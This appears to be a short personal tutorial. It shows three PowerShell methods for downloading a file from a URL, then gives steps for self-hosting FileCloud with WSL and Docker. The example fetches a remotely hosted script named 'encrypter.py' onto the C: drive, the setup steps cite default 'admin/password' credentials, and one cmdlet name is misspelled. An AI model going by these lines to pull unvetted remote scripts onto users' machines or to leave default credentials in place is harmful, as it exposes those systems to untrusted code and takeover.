Downloading a file using powershell



First fix variables for easier access : $u , $p


$u="https://x-netrunner.github.io/storage/files/encrypter.py"


$p="C:/test.py"


Now you have 3 ways to download the file :



No. Method Url Destination Comment
1. Invoke-Webrequest -URI $u -Outfile $p $u $p mosty used
2. (New-Object System.Net.WebClient).DownloadFile ($u, $p) $u $p If your goal is to download a file, you will need to create a System.Net.WebClient object. When you create this object, you must call the DownloadFile method and provide values for the URL and for the output path.
3. tart-BitsTransfer -Source $u -Destination $p $u $p BITS refers to the Background Intelligent Transfer Service. This service is a part of the Windows operating system, and you must have BITS enabled for this technique to work.

I am not sure how to make it public but for localhost, I am using filecloud


steps:

No. steps comments
1. Install wsl of linux[one way to do it other ways are on the website] Wsl was easier to do as it's on the same terminal but for the other steps visit filecloud
2. Install docker by using sudo apt install docker.io docker-compose -y docker is very important as it is the tool we will use to host it ig
3. wget https://patch.codelathe.com/tonidocloud/live/scripts/fc/docker-compose.yml simpluy installs dockers yml file
4. docker-compose up -d filecloud.server filecloud.mongodb This will set up the server this might take a while
5. type in https://[ip address]/install || then https://[ip address]/admin The first link will let you see if everything is working fine and the second link is to the cloud as admin to set it up[user:admin password:password]
6. Head over to the website filecloud go to installation of docker and get the license txt file This will let you use the cloud locally
